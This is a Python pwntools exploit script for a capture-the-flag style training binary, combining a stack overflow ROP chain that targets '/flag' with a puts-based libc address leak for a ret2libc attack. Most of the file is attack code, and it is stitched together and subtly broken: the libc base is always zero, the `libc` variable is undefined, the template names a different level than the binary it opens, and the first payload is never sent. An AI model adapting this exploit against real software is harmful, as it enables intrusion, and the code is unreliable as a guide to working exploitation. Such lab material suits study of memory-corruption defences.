#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babystack_level7
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or '/challenge/babystack_level9')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled


def rop_chain(base, rbp):
    pop_rdi = [base+0x23b6a, rbp]
    pop_rsi = [base+0x2601f, 0x4]
    syscall = [base+0x10db60] 
    chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
    return chain 

io = start()
io.recvuntil(b"base pointer rbp: ")
bp = int(io.recvline(keepends=False), 16)
print(bp)

io.recvuntil(b"will be stored: ")
buf = int(io.recvline(keepends=False), 16)
print(buf)

libc_sys = 0x52290
libc_base = libc_sys - 0x52290 

payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop_chain(libc_base, bp)

rop = ROP('/lib/x86_64-linux-gnu/libc.so.6')

PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
OFFSET = 2048+8

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))


def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = b'A'*OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(io.clean()) # clean socket buffer (read all and print)
    io.sendline(rop1)

    #Parse leaked address
    recieved = io.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") 


# io.sendline(payload)

io.interactive()

